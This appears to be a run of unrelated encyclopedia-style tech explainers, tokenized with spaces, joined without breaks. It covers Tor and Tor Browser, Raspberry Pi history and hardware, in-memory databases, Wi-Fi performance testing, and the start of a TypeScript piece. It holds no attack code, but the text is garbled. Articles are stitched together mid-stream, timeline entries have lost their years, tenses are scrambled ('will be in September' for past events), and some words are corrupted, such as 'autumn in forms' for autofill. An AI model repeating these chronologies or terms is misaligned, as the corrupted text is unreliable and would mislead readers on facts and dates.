Let 's say , the message goes through nodes A ( Guard ) , B ( Relay ) and C ( Exit ) .
The Tor client first encrypts the message with C 's key , then B 's key , and finally A 's key .
When A receives the message , it decrypts it with its key .
This will reveal to A that the next hop is B. However , A ca n't know who 's C or the destination .
In summary , each node along the route has only partial information .
This preserves user anonymity .
The focus is on hiding IP addresses of source / destination and routers along the route rather than the message content itself .
Unlike traditional IP routing , Tor routing requires the sender to know in advance the route to destination , and the keys of routers along the way .
In the original onion route , public - key cryptography was used .
Encryption was done with public keys and decryption with private keys .
Today 's Tor network uses symmetric keys for encryption and asymmetric public / private keys for authenticating Tor nodes .
Can my ISP know that I 'm using Tor and penalize me for it ?
Because Tor has been used for illegal activities , some ISPs might throttle or block Tor traffic .
Thanks to the onion route , your ISP ca n't know which site you 're visiting or read your traffic .
However , the ISP will know that you 're using Tor .
This is because the IP addresses of Tor 's nodes are publicly available .
Tor Bridges provide a solution to this problem .
A bridge is also a Tor node but it 's not listed on the main Tor directory .
So your ISP ca n't easily block all bridges .
But ISPs have a solution to this .
They inspect packets to figure out if Tor is being used .
To partly overcome this , we can use pluggable transport .
These obfuscate the packets so that they do n't resemble Tor traffic .
Is n't Tor doing the same thing as a VPN or proxy ?
Comparing VPN and Tor .
Source : Mason 2018 .
A Virtual Private Network ( VPN ) routes all your Internet traffic through a VPN server that hides your IP address .
The VPN provider will have many servers worldwide and one of them will be used .
Because online services see requests coming from a VPN server , your location is masked .
Moreover , all traffic between your device and the server will be encrypted .
Tor also routes traffic via intermediate servers .
The main difference between VPN and Tor is one of trust .
A VPN provides privacy , but this can be compromised if you do n't trust your VPN provider .
Your VPN provider may use weak encryption , may store logs about all your activities and may be forced to share them with governments .
Being decentralized , there 's no need to trust anyone on Tor .
No logs are stored .
While VPN is about privacy , Tor is more about anonymity .
We can also state that VPN emphasizes encryption while Tor emphasizes routing .
Ultimately , a VPN is sufficient for most online activities .
Activists and journalists living under strict censorship laws , when their lives are at risk , can use Tor .
What are the limitations or criticisms of Tor ?
While Tor has its benefits , it can also be misused .
Hackers use Tor to hide their identities .
They can use Tor for ransomware attacks .
Tor can be used for low bandwidth , slow Distributed Denial - of - Service ( DDoS ) attacks .
Tor 's hidden services feature has been used to publish suspicious or illegal content : drugs , firearms , child pornography .
One study found that a Tor user is 6 - 8 times more likely to perform a cyberattack .
This gives bad repute to all Tor users whose activities could be wrongly suspected .
ISPs will throttle your Tor traffic or even block it completely .
Some websites block Tor nodes .
For example , Wikipedia does n't allow content edits from anonymous authors since logging IP addresses of Tor exit nodes makes no sense .
This prevents vandals but also blocks genuine authors .
Tor has been criticized for being slow .
It ca n't handle peer - to - peer file sharing .
Setting up a Tor relay node is also non - trivial .
How do I get started using Tor ?
The simplest way is to install Tor Browser for anonymous Internet access .
If access to the Tor Project website is blocked , you can send an email to ` gettor@torproject.org ` .
The email body should contain one of these words : windows , OSX or Linux .
You 'll get a link to download Tor Browser .
If you wish to use the Tor network for purposes other than web browsing ( such as FTP or SSH ) , read about private , torsocks , and torification .
To learn more , the official Tor documentation and Tor FAQ are good places to start .
The faq is also a good place to find solutions to common problems .
For community support , head to Tor StackExchange .
Follow Privacy Enhancing Technologies Symposium ( PETS ) , an annual event featuring the latest developments .
For in - depth understanding , read Tor specification documents .
If you run a site , and it 's getting hacked over Tor , you can block exit nodes that are accessing your server .
An online service such as TorDNSEL can also help .
What are the different projects based on or related to Tor ?
For safe web browsing , use the Tor Browser .
For Tor statistics and resource utilization , use Nyx and Metrics Portal .
Orbot is a project that aims to bring web browsing to the Android platform .
Orlib is a library that can be used with any Android app to route traffic through Orbot / Tor .
Tails is a live CD / USB distribution of Tor and leaves no trace on the local system .
There are also many community projects .
OnionShare is for anonymous file sharing .
SecureDrop is for whistleblowers to submit documents to media organizations .
GlobalLeaks also enables whistleblowers .
Ahmia is a search engine for content published on Tor Onion Services .
Three general methods to " torify " apps are proxification , socksification , transsockification .
A Torifier can be used to tunnel any software application over Tor .
For developers , Shadow , Stem and TXTORCON might be of interest .
Orchids can be used to torify Java and JVM applications .
With widespread adoption of the Internet in the 1990s , the US government realized that the Internet could be used by its spies for sharing intelligence .
But the problem of identity and security of sources has to be solved .
Hence , the US Office of Naval Research has started funding research on Onion Routing .
This research was initially carried out by Paul Syverson , Michael G. Reed and David Goldschlag at the US Naval Research Laboratory .
The first prototype system that does onion routing was built .
It runs on a single Solaris 2.5.1/2.6 machine emulating five nodes .
In July , the code was approved for public distribution .
Work started on the second generation onion route .
This is the beginning of Tor .
The name is not an acronym , although it can be expanded as " The Onion Routing " .
The Alpha release of Tor will be in September .
The Tor network is deployed .
Tor code is open source under MIT license .
Location hidden services are deployed .
This is the beginning of Tor Onion Services .
The Tor Project is funded by the Electronic Frontier Foundation , whose mandate is to defend digital privacy , free speech , and innovation .
In August , the Tor design paper was published at the USENIX Security Symposium .
By the end of the year , there will be 100 Tor nodes .
The first major criminal activities on Tor are reported .
Meanwhile , the US government continues to fund Tor .
About 75 % of total donations for the year come from the US government .
In 2013 , this figure is about 93 % .
A leaked presentation from the National Security Agency ( NSA ) reveals that they tried to hack Tor and failed .
Meanwhile , Edward Snowden leaks NSA documents via Tor .
FBI closes Silk Road , a Dark Web marketplace for drugs , weapons and stolen data .
Tor users averaged over the year 2015 .
Source : Kire 2017 .
In 2015 , the Tor network has over 7000 nodes worldwide .
Daily , more than 2 million users connect to Tor .
One study reports that Tor serves 8 million users per day .
This involves 1.2 billion anonymous circuits per day carrying approximately 517 TiB of data ( 6.1GiB / s ) .
Welcome screen of the Tor Browser v3.5.3 .
Source : Tor Project 2019 .
Tor Browser is a standalone desktop application that helps users browse the web safely and anonymously .
Since many users use the Internet via a web browser , Tor Browser is a useful application for anonymity .
It hides your device 's IP address and its location .
It prevents third parties from snooping into your online activities or even tracking you .
Tor Browser is based on the open sourced code of the Firefox browser .
It adds further privacy and security settings .
Underneath , the Tor Browser relies on the Tor network of relay nodes .
In the past , it was difficult to use Tor since one had to install a number of tools separately .
Today , Tor Browser bundles all the necessary tools into a single archive of files , thus making it easier for users to adopt Tor .
What are the features of the Tor Browser ?
The Tor Browser allows us to inspect the current circuit .
Source : Cimpanu 2018 .
Tor Browser is cross - platform and available for x86 and x86_64 architectures .
Encryption and decryption are done automatically .
It can update itself to the latest version .
What previously required separate installations of Tor , Firefox browser , Torbutton ( Firefox add - on ) and Polipo ( HTTP proxy ) , are now conveniently bundled within the Tor Browser .
A new separate circuit is automatically created for each domain , though they share a common guard node .
This process is transparent for users , but Tor Browser allows users to inspect the current circuit and request a new circuit if so desired .
From within the browser , users can also request Tor bridges by solving a captcha .
Each circuit lives for only ten minutes .
Since each website is isolated from another , this prevents tracking by third parties .
Tor Browser resists browser fingerprinting .
To prevent cookie - based tracking , cookies and browsing history are cleared when the browser is closed .
It also prefers DuckDuckGo to Google as the search engine , since Google tracks you and logs your search queries .
What are the variants of Tor Browser for different platforms ?
Tor Browser is available for Microsoft Windows , Apple MacOS and GNU / Linux .
As of March 2019 , an experimental version 8.5a8 is also available for Android .
Two popular add - ons that come with Tor Browser by default are NoScript and HTTPS Everywhere .
For Android , there 's also Orbot , a proxy that enables Tor access for any mobile app .
Orfox is a browser for Android that was developed as part of the Guardian Project .
This is likely to be discontinued when a stable version of Tor Browser for Android is released .
The Third - party Onion Browser is the one to use for iOS .
I already use private / incognito mode in Firefox / Chrome .
Why do I need Tor Browser ?
A study from 2010 shows what information leaks from the browser 's public mode to private mode .
Source : Aggarwal et al .
2010 , table 1 .
Private modes avoid saving your browsing history and cookies .
Otherwise , they are vulnerable to fingerprinting and network adversaries .
Shortcomings are plugins , fingerprinting , DNS leaks , SSL state leaks , autofill and site - specific zoom .
This is where the Tor Browser becomes useful .
On a related note , Tor provides anonymity at the route layer .
However , Tor ca n't protect you if your hardware is compromised , such as a key logger .
Tor does n't encrypt traffic between the exit node and final destination , for which you should use app - level encryption , such as SSL for HTTPS traffic .
In fact , an add - on such as HTTPS Everywhere can help in enforcing security for sites that support it .
Electronic Frontier Foundation has a nice animation to show how HTTPS works alongside Tor .
Tor will also not protect you from improper usage .
For example , BitTorrent over Tor is not anonymous .
What are some alternatives to the Tor Browser for anonymous web browsing ?
The Tor Browser is not the only way to achieve anonymity while browsing the web .
I2P provides a peer - to - peer distributed communications layer .
It 's suited for hidden services .
Freenet uses a similar P2P technology .
Linux - based distributions that focus on privacy and anonymity ( some of which use Tor underneath ) include Tails , Subgraph and Freepto .
Qubes OS is a desktop OS focused on security .
It uses virtualization to give users any OS of their choice .
Whonix OS is integrated into Qubes .
With Whonix , we can connect to Tor from inside a VM .
Epic Browser does n't use any special networking architecture .
However , it disables history , third - party cookies , DNS pre - fetching , and autumn in forms .
These are common ways in which privacy can be compromised .
The Brave browser integrates Tor .
Users can open a private tab with Tor .
Other alternatives are listed at alternative.me .
The Tor network is deployed .
Tor code is open source under MIT license .
Tor itself is an improvement over Onion Routing that started as a research project in 1995 .
Version 1.0.0 of Tor Browser Bundle has been released .
Tor Browser 7.0 is released with multiprocess mode and content sandbox as two major features .
Sandboxing is not yet available on Windows .
Until this release , the lack of sandboxing was a problem and was exploited by the FBI .
This version is based on Firefox 52 Extended Support Release ( ESR ) .
ESR is meant to help organizations to mass deploy the browser .
Screenshots from Tor Browser for Android .
Source : sysrqb 2018 .
Tor Browser version 8 was released based on the Firefox Quantum codebase that came out in November 2017 .
The user interface is the Photon UI that Firefox Quantum uses .
Also in September , the alpha release of Tor Browser for Android happens .
New Tor Browser logos for desktop and Android .
Source : boklm 2019 .
Tor Browser version 8.5 becomes the first stable release for Android .
Tor Browser also gets newly designed logos compatible with Firefox 's Photon UI .
Raspberry Pi 3 Model B+ .
Source : Stanton 2018 .
The Raspberry Pi is a credit - card - sized single - board computer ( SBC ) designed in the UK .
It was started with the idea of making computers affordable , accessible and fun for a new generation of programmers .
Since its first release in 2012 , many variant models of the Pi have been released , from $ 5 to $ 35 .
By 2018 , more than 20 million units of the Pi were sold .
Though it was conceived as an educational tool , the Raspberry Pi has since been used for home automation , in industrial systems and even on the International Space Station .
It 's managed by the Raspberry Pi Foundation .
The schematics is available but the board itself is not open hardware .
What are some applications where the Raspberry Pi is suitable ?
Some cool projects built with Pi .
Source : Geeks Life 2018 .
It 's ideal for beginners to learn about computers and programming .
With Raspbian as the OS , Python and Scratch come by default .
You can make music with a Sonic Pi .
Those interested in gaming can play and even tweak Python - based games .
You can setup a web server on the Pi .
For scientific computing , start using Mathematica .
The Pi can also handle streaming video , playing audio / video or be used as a media centre .
It 's also a good platform to learn electronics , interface sensors and build IoT projects .
Many have used it for home automation projects .
The small form factor and lower power requirements of Pi Zero enable battery - powered applications , possibly in remote areas .
It can be used as an IoT gateway .
With the increasing need for edge processing and analytics , the Pi has been used for such purposes .
In general , while a microcontroller - based system ( such as Arduino ) is good at input / output , the Pi is more suitable for applications that require a lot more data processing , involve media streaming , network with other devices , or manage multiple processes .
What interfaces does a Raspberry Pi expose ?
Pi pinout with board pin numbers in the middle and BCM numbers outside .
Source : Hawkins 2014 .
While some models remove some of these interfaces , the following are present on Pi 3 Model B+ : 4 x USB 2.0 , Gigabit Ethernet , HDMI , analogue audio / video 3.5 mm jack , Camera Serial Interface ( CSI ) , Display Serial Interface ( DSI ) and a 40-pin GPIO header .
CSI can connect to a camera .
DSI can connect to a touchscreen display .
For wireless networking , there 's 802.11ac , Bluetooth 4.2 and BLE .
The GPIO header supports common digital interfaces : I2C , SPI and UART .
There are 17 pins for GPIO .
There 's also an I2S interface for audio output .
All GPIO run on 3.3V and can give a maximum of 20mA. Due to these interfaces , the Pi is being used for IoT and robotics applications .
One interface that the Pi lacks is the Analog - to - Digital Converter ( ADC ) .
An external ADC must therefore be used to interface with analogue sensors .
The Pi can also be expanded with HAT ( Hardware Attached on Top ) expansion boards .
What hardware variants of the Raspberry Pi have been released to date ?
Comparing the main variants of the Raspberry Pi .
Source : Raspberry Pi Docs 2019a .
There have been to date four generations of Raspberry Pi : Gen1 : Model B , Model A , Model B+ , Model A+ , Compute Module 1 Gen2 : Pi 2 Model B , Pi Zero Gen3 : Pi 3 Model B , Pi 3 Model B+ , Pi 3 Model A+ , Pi Zero W , Pi Zero WH , Compute Module 3 , Compute Module 3 Lite , Compute Module 3 + Gen4 : Pi 4 Model B ( 1/2/4 GB ) Compute Module is for industrial applications .
Higher generation boards have a faster CPU and more memory .
In terms of form factor , cost and capability , in decreasing order are the B , A and Zero models .
The " plus " variants are better than the plain ones of that generation .
Wireless connectivity was introduced for the first time in third generation models .
Hence , both Pi Zero W and WH belong here .
SocialCompare gives a featured comparison of most variants .
RasPi .
The TV gives a nice picture of all the boards .
How does one go about setting up a Raspberry Pi ?
Steps to connecting Raspberry Pi to peripherals .
Source : Joseph 2013 , slide 14 .
The Raspberry Pi is just the processing module .
It offers a number of interfaces to connect peripherals .
HDMI can be used to connect to a display monitor or TV screen .
For older displays , there 's an analogue video interface .
USB ports can be used to connect mouse and keyboard .
Ethernet port is for a wired LAN connection .
Otherwise , on - board Wi - Fi of Pi 3 models can be used to connect to a wireless LAN .
With older models , a USB - based Wi - Fi dongle can be used instead .
There 's a micro USB to power the Pi .
However , Pi wo n't do anything without an operating system and software to run it .
These should be loaded into an SD card .
Online instructions can guide you to preparing the SD card .
To use the Pi from your desktop / laptop , read about headless mode and VNC .
What is the software support for Raspberry Pi ?
The Raspberry Pi needs an operating system ( OS ) .
The official OS supported by the Foundation is Raspbian , which is based on the Debian Linux distribution .
Some Linux - based alternatives are Ubuntu MATE , Snappy Ubuntu Core and RaspBSD .
There 's also Windows 10 IoT Core , Android Things , PiNet , Weather Station and IchigoJam Pi .
To use Pi as a media centre , we can use OpenELEC , LibreELEC or OSMC .
RISC OS , developed in the 1980s for ARM processors , can be used .
For those who prefer a command line interface , try Plan 9 .
To use Pi for gaming , try RetroPie , RecalBox , Lakka and PiPlay .
Many of these can be installed using the NOOBS installer .
You could also install them directly .
Further software support depends on the OS used .
For example , Raspbian comes pre - installed with Python , Scratch , Sonic Pi , Java , and more .
Python library Rpi .
GPIO and Wiring Pi are useful for IoT programming .
What resources can help a beginner learn the Raspberry Pi ?
The official website is a good place to start .
The FAQ page will clarify many basic questions .
Get involved in the Pi community .
Read the blog .
Subscribe to the newsletter .
Raspberry Jams are local meetups for sharing knowledge or collaborating on Pi projects .
Use the Pi Forums to ask or give help .
Get inspired by Pi projects that others have created .
Search online for tutorials , books , and projects posted on community websites .
Programming the Raspberry Pi by Simon Monk is recommended for beginners .
For inspiration , visit Instructables and Hackaday .
On Pi Day 2018 , one blogger shared 314 useful resources for Raspberry Pi enthusiasts .
In the 1980s , BBC Micro in the UK and Commodore 64 in the US made computers accessible to home users .
The BASIC programming language could be used to program these computers .
An early prototype built by Upton in 2006 .
Source : Heath 2018 .
Eben Upton at the University of Cambridge notices how fewer students are applying for computer science courses .
He blames it on the lack of affordable computers for educational purposes .
Children have access to only games consoles ( and tablets and smartphones in later years ) .
They have become consumers of content rather than programmers .
Upton builds a computer using off - the - shelf parts and a soldering iron .
It runs on an Atmel microcontroller .
Raspberry Pi logo .
Source : Raspberry Pi 2019d .
At a meeting involving Eben Upton ( now an SoC architect at Broadcom ) , Alan Mycroft and Pete Lomas , the vision for the Raspberry Pi took shape .
It 's not about giving kids a black box .
It should be a bare board that helps them know its components , tinker with open source code and learn how computers work .
The second prototype is built using Broadcom components .
The name Raspberry Pi is also coined , " Pi " because it boots into Python .
A logo will be selected later in 2011 via an open competition .
To develop the Raspberry Pi and promote basic computer science in schools , the Raspberry Pi Foundation was formed as a charity .
Despite having the Foundation , the next two years will prove difficult for realize the hardware at its desired price point of $ 35 .
A thumb - drive prototype of the Raspberry Pi has been released in the UK .
A YouTube video of the same picked up 600,000 views in just two days .
This is made possible by a low - cost ARM - based Broadcom SoC BCM2835 released in early 2011 .
The SoC was meant for applications such as electronic devices and digital signs , but now reimagined to power the Raspberry Pi .
Raspberry Pi Alpha board of 2011 .
Source : Heath 2018 .
The first 50 Raspberry Pi Alpha boards have been released , built by Broadcom .
The board has many features and interfaces that will become standard in later versions .
However , it 's $ 110 a piece plus it is slightly larger than the desired size of a credit card .
Many design decisions are made to achieve the final $ 35 credit - card - sized Pi .
The beta boards come out in December .
The first Raspberry Pi Model B was released .
Orders quickly reached 100,000 .
A simpler and cheaper variant of this called Model A will be released in 2013 .
This has only 1 USB port and no Ethernet port .
Raspberry Pi Model B+ and Model A+ have been released .
The GPIO header increased from 26 to 40 pins .
The new boards also use less power .
Upton later comments that Model B+ was the one they intended to make back in 2012 .
The success of earlier models and high volumes , driving down costs ( 2.5 million by February 2014 ) , have helped achieve Model B+ at a retail price of $ 35 .
The Raspberry Pi 2 Model B has been released .
Compared to Model B+ , it doubles the RAM size from 512 MB to 1 GB .
The speed increases from 700MHz to 900MHz .
There are four USB ports rather than two , thus removing the need to get a USB hub .
The SoC is based on quad - core ARM Cortex - A7 .
For applications that require fewer interfaces , there 's already Model A and Model A+ .
By removing the pinout header , removing more interfaces , and reducing HDMI and USB to smaller form factors , the Raspberry Pi Zero is released .
It retails for only $ 5 .
It draws less than 1 watt of power .
In 2017 , Zero W includes wireless connectivity .
In 2018 , Zero WH includes the GPIO pinout header .
The Raspberry Pi 3 Model B has been released .
It uses a 64-bit SoC. This becomes the first model to add wireless connectivity : Wi - Fi 802.11n and Bluetooth 4.1 .
This can also boot from a USB .
In 2018 , variants Pi 3 Model B+ and Pi 3 Model A+ be introduced with 802.11ac and Bluetooth 4.2 .
By the end of February , 25 million units of Raspberry Pi were sold worldwide .
In June , the Raspberry Pi 4 Model B was released with support for 4 K video .
In - memory Database Architecture .
Source : Kodamasimham 2013 .
An In - Memory Database ( IMDB ) , also called Main Memory Database ( MMDB ) , is a database whose primary data store is the RAM .
This is in contrast with traditional databases which keep their data in disk storage and use RAM as a buffer cache for frequently / recently used data .
IMDB has gained traction in recent times because of increasing speeds , reducing costs and the growing size of RAM devices , combined with powerful multi - core processors .
Since only RAM is accessed and there is no disk operation for an IMDB query , speeds are extremely high .
However , RAM storage is volatile .
So there will be data loss when the device loses power .
To overcome this , IMDB employs several techniques , such as checkpoints , transaction logging , and non - volatile RAM .
Among commercially available IMDBs is SAP HANA .
Open source options are Redis , VoltDB , Memcached , and an extension of SQLite .
What 's the context for the growing interest in IMDB ?
From 1995 to 2015 , RAM got 6000 times cheaper .
Prior to that , disk drives were the main option for storing databases .
The Disks were great for sequential access but poor for random access since a lot of time was spent on rotating the disk and seeking the exact location .
Meanwhile , computing power has increased via faster clocks and multi - core processors .
Networking speeds have also gone up .
However , disk access speeds have not gone up fast enough .
In fact , they 've become the bottleneck in computing systems .
Worse still , the amount of data being generated has grown exponentially .
There 's also a need to analyse all this data ( via Machine Learning ) in almost real time .
This is where in - memory databases become suitable .
They 're now affordable enough to store large amounts of data , particularly compressed columnar data .
They 're fast enough for real - time analytics .
We can continue to use disks where sequential access is desired , such as for logging .
The notable database scientist Jim Gray once supposedly said , Memory is the new disk . What are the key features of IMDB ?
How do they vary from disk - based RDBMS ?
Column Store Indexing and Compression .
Source : shyamuthaman 2016 .
Disk access is sequential .
In disk - based DBs , the time to locating records on the physical disk is the biggest contributor to query time .
In an IMDB , since entire data is in memory , this burden is entirely eliminated .
While RAM is volatile , data persistence is achieved through multiple methods and it ’s done very efficiently .
These safeguard from data loss due to power failure .
Since only a minority of DB operations are data change operations ( about 10 - 15 % ) , disk operations are minimal .
Most IMDB support columnar data storage , where table records are stored as a sequence of columns , in contiguous memory locations .
This speeds up analytical querying greatly and minimizes CPU cycles .
When data is stored in columnar form , column - wise compression techniques ( such as sparse columns ) are used to minimise memory footprint .
Moreover , there 's less dependence on indexing .
IMDB delivers performance similar to having an index on every column , but with much less transactional overhead .
What are the popular applications of IMDB ?
IMDB works well for applications that require very fast data access , storage and manipulation .
Real - time embedded systems , music and call databases in mobile phones , telecommunication access networks , programming data in set - top boxes , e - commerce applications , social media sites , equity financial services are the most prevalent applications of in - memory databases .
IMDBs have also gained a lot of traction in the data analytics space .
How do the performance characteristics compare between IMDB and traditional DB ?
Performance comparison IMDB Vs RDBMS .
Source : Altibase 2019 .
CPU and Memory - Accessing data in memory is much faster than writing to / reading from file systems .
The IMDB design is simpler than on - disk databases , so they have significantly lower memory / CPU requirements .
Even if a machine hosting an RDBMS has enough memory on board to fit the entire data , IMDB would be faster .
That 's because it performs fewer copy operations and has more advanced in - memory data structures , optimized for working with memory .
However , IMDB scales poorly to multiple CPU cores .
Data Query and Update functions - Applications requiring random data access under 1ms ( such as online / real - time applications ) benefit from IMDB .
If access time over 100ms is acceptable , traditional RDBMS works fine .
For sequential access , the difference is even more pronounced .
Persistence operations do n’t affect data update times in IMDB since they happen offline .
Size constraints - Generally , not more than 200 - 300 GB RAM is installed on a machine in order to keep machine start - up time acceptable .
So when DB size is in the TB range , supporting millions of transactions per second , memory sharding is done to partition one logical DB into multiple physical DBs .
What are the ways in which persistence is supported in IMDB ?
There are many methods by which IMDB might keep the data state on disk .
The end goal is to ensure complete recovery of data but without compromising on query speeds .
Transaction Logs - Each data update is applied to the IMDB and also on a transaction log on the disk .
Change entries done at the end of the append - only log file .
When the file size rolls over , its contents are archived .
Checkpoint Images - Checkpoint files contain an image of the database on disk .
Some IMDB use dual checkpoint files for additional safety , in case the system fails while a checkpoint operation is in progress .
For recovery , the database checkpoint on the disk is merged with the latest transaction log entries .
High Availability - To protect against memory outages in data centers , the data cluster is replicated asynchronously into a second read - only cluster .
If an outage occurs , hot swap gets triggered to configure the secondary as primary .
Non - volatile RAM - Using battery powered RAM devices or supercapacitors , all writing operations can be persistent even after power loss .
These are slightly slower than DRAM , but much faster than RDBMS disk operations .
What are some commercial IMDB products ?
SAP HANA Business Data Platform .
Source : HANA 2019 .
Without being exhaustive , we describe three commercial IMDB products : SAP HANA - In - memory , column - based data store from SAP .
Available as a local appliance or cloud service .
The in - memory data is CPU - aligned , no virtual expensive calculation of LRU , logical block addresses , just direct ( pointer ) addressing of data .
Supports server scripts in SQLScript , JSON and R formats .
Good support for predictive analytics , spatial data processing , text analytics , text search , streaming analytics , graph data processing , and ETL operations .
It guarantees microsecond response and extremely high throughput performance .
Oracle TimesTen - In - memory OLTP RDBMS acquired by Oracle .
It guarantees microsecond response and extremely high throughput performance .
It provides application level data cache for improved response time .
High availability through replication .
eXtremeDB - Combines on - disk and in - memory data storage in a single embedded database system .
It can be deployed as an embedded database system or an elastically scalable client / server distributed database .
What are some open source IMDB platforms ?
Here are some open source IMDB platforms to consider : Apache Ignite – Java - based middleware that forms an in - memory layer over any existing DB .
They can work in a single or distributed environment .
Seamless integration with MapReduce and Hadoop systems .
Altibase - Hybrid database that combines an in - memory database and an on - disk database into a single product to achieve the speed of memory and the storage capacity of disk .
SQLite - Instruct an SQLite database to exist purely in memory using the special filename ` : memory : ` instead of the real disk filename .
Redis a Key - value store based system with support for key data structures .
Schema is free .
The Data durability feature is optional .
Good programming language support .
VoltDB - Traditional RDBMS with schema support .
Works using Java Stored Procedures that applications can invoke through JDBC .
The company is collaborating with Samsung for Scaling In - Memory Data Processing with Samsung DRAM / SSD devices .
What are the cases where an IMDB is not suitable ?
Volatile memory is affordable and servers with support for 24 TB of RAM are now available .
But IMDB can not replace the traditional RDBMS in all scenarios .
The following are some of the use cases where IMDB is not suitable when : Persistence is critical - Applications with confidential / critical data undergoing frequent updates might be at risk in IMDB .
Unless persistence features are in the IMDB , there 's a risk of data loss during power failure .
Very small scale data - Small and medium enterprises can simply run on low - cost server with acceptable performance .
Memory - intensive applications - When IMDB is used , the bulk of RAM will be occupied by the DB itself .
So if the application itself requires high memory ( such as 3D games , live streaming ) , then memory costs will rise significantly .
Very large scale data applications - Memory requirements would be prohibitively expensive , hence not recommended .
Non - mission - critical operations - Backend operations or applications where data can be batch processed offline do n't require millisecond query response times of IMDB .
The term " relational database " was invented by E. F. Codd at IBM in 1970 .
IBM 's IMS / VS FastPath is one of the earliest in - memory engines .
In telecoms and defence domains , some companies have started using in - memory databases .
However , these are internal to those who used them and generally not available for purchase .
The Oracle 7 version supports data buffers where a snapshot of a data block would be taken from the disk and stored in RAM for faster access .
TimesTen releases its first version in - memory database .
TimesTen was later acquired by Oracle .
Redis , an in - memory data structure project , is its first release with a BSD license .
It has become one of the most popular key - value store databases .
Early versions of SAP HANA have been present since 2005 .
In 2012 , SAP will promote its commercial version for cloud based applications .
HANA now includes a business suite of applications covering ERP and CRM domains under one umbrella .
Oracle releases its Oracle 12c cloud RDBMS business suite with in - built support for in - memory DB operations .
A simple setup for Wi - Fi performance testing .
Source : AccessAgility 2018 .
Often , customers complain to their ISPs about low data rates on their broadband or fibre connections , when the actual source of the problem is the variable performance of Wi - Fi .
Wi - Fi performance is influenced by many factors , including the quality of devices on the network , other networks in the area that are causing interference , or obstructions such as walls .
When testing Wi - Fi for performance , it 's important to measure beyond just the throughput involving only a single active client .
Testing should mimic real - world scenarios as much as possible .
Performance testing for Wi - Fi clients is usually simpler than that for access points .
The purpose of such testing is to validate a deployment or identify performance issues so that corrective actions can be taken .
What are the main metrics to measure during Wi - Fi performance testing ?
TR-398 defines six dimensions for evaluating Wi - Fi performance .
Source : Jackson 2019 .
A good reference for Wi - Fi performance testing is TR-398 , Indoor Wi - Fi Performance Test Standard , defined by the Broadband Forum .
This looks at six metrics : RF performance , bandwidth , stability , interference , capacity , and coverage .
Bandwidth deals with throughput and fairness of resource allocation across stations .
We should check for seamless connectivity as clients move across access points .
To identify bottlenecks , we need to look at CPU utilization , memory usage , and buffer status .
Application - level metrics matter as well .
Packet loss , latency and jitter are important metrics for audio and video streaming applications .
These can be translated into an objective Mean Opinion Score ( MOS ) to determine how the user perceives quality .
In a real - world Wi - Fi deployment , what performance tests should I run ?
Some access points are unfair in their resource allocation .
Source : Van Winkle 2011 .
In a typical deployment , engineers check for signal levels , coverage and throughput to ensure basic performance requirements are met .
Usually a single client is used , but this is far from real - world scenarios .
It 's therefore important to check performance when the network is loaded with multiple busy clients .
Since it 's hard to use hundreds of real clients , an emulation - based approach can be adopted .
The Wi - Fi environment is too dynamic to reproduce performance issues .
In fact , performance testing does n't help with troubleshooting problems .
A better approach is to collect data from live networks and analyse this data .
With modern Wi - Fi networks being controlled from the cloud , it 's become possible to adjust a configuration , collect performance data , send it to the cloud and then evaluate if the adjustment had a positive effect .
Some performance problems could be due to misconfiguration such as access point connected to the wrong switchport , poor quality cables , wrong channel assignments , or bandwidth limits unknowingly imposed .
What traffic models should I use for Wi - Fi performance testing ?
Spirent TestCenter emulates multiple clients and also generates different types of traffic for testing .
Source : Tolly 2019 .
To mimic real - world scenarios , a variety of traffic types coming from multiple devices must be used .
This may include a mix of TCP and UDP data , streaming video or audio , voice calls , and a mix of mission - critical and recreational apps .
The idea of mixing different traffic types is that the pattern of packet arrivals is different .
The voice is periodic while the video starts with a surge and then at a constant rate .
HTTP traffic comes in bursts as pages are loaded .
We should thus monitor buffers and CPU utilization for bursty traffic as well .
A classroom scenario could include multicast video streaming , parallel file downloads , and background social media traffic of small packets .
A dormitory scenario could include parallel video streaming , two - way video chats , online gaming , web browsing , and social media traffic .
A stadium scenario would be heavy on video streaming or audio commentary involving thousands of clients .
Performance testing should consider these diverse real - world deployment scenarios .
Could you share some insights discovered by others during Wi - Fi performance testing ?
Before starting any tests , check all cabling and configuration .
Devices should be configured to exercise their maximum capability .
Turn off other devices that are not part of the tests .
Avoid a VPN while testing .
Restart devices , stop background tasks or updates , disable antivirus , or even do a clean OS installation before starting the tests .
Update devices to the latest drivers .
One suggestion is to establish a baseline application throughput .
This can be done by copying a large file from a server connected via Ethernet to the wireless router , to a client device connected via Wi - Fi to that router .
No other clients should be on the network .
Then you can add more clients to the network or try streaming traffic to see how these affect the baseline .
It 's been noted that CPU utilization is higher than usual and varies the most when packet sizes are small , such as for VoIP traffic .
Another finding is that device OS plays a role as well .
For example , Windows clients have longer inter - packet idle periods , thus resulting in lower throughput compared to Linux clients .
What tools are available for doing Wi - Fi performance testing ?
Ekahau HeatMapper gives a heat map to assess a Wi - Fi deployment .
Source : Cox 2019 .
While there are many online sites to help you measure your Internet speed , this is really an end - to - end performance test .
To test the performance of only the Wi - Fi network , you should do an internal test .
Likewise , the speed shown in Windows OS is the transfer speed between the PC 's adapter and the router , not the throughput seen by applications .
For network deployment , there are tools for site survey and generation of heat maps of signal strengths : Ekahau Site Survey , iBwave , NetScout AirMagnet , Tamograph Site Survey , SolarWinds , VisiWave Site Survey , AirMagnet Survey , Acrylic Wi - Fi , and NetSpot .
For throughput testing , iPerf3 ( and its variants ) , Tamosoft , HE.NET Network Tools , and Ixia 's IxChariot are examples .
iPerf3 is open source and many tools such as WiFiPerf Professional are built on top of iPerf3 .
Spirent offers products that can emulate hundreds of Wi - Fi clients with different traffic types and also emulate movement across access points .
Similar emulation is offered by Alethea and LANforge WiFIRE .
ESNet began work on Iperf3 since Iperf2 had not been updated for a while .
The goal is to keep the tool simple and maintainable .
Hence , it 's designed as a single thread as opposed to the multithreaded nature of iperf2 .
Bob McMahon of Broadcom revives iperf2 , fixing many of its problems and adding new features .
Version 2.0.8 be released in 2015 .
Since iperf2 is multithreaded , it may be a better choice for generating parallel traffic streams .
Broadband Forum releases TR-398 , Indoor Wi - Fi Performance Test Standard .
Prior to this standard , it was generally difficult to compare the performance of different devices .
TR-398 enables systematic quantitative testing and performance comparisons .
In its first release , TR-398 did n't cover 802.11ax .
TypeScript logo .
Source : Adapted from m - a - ge 2017 .
JavaScript is now truly cross - platform .
It works within browsers .
It 's being used to build standalone desktop applications .
Enabled by Node.js , it 's also being used for server - side execution .
It can work on any OS .
The problem with JavaScript is its lack of scalability .
It 's not ideal for large projects maintained by large teams .
TypeScript makes JavaScript scalable .
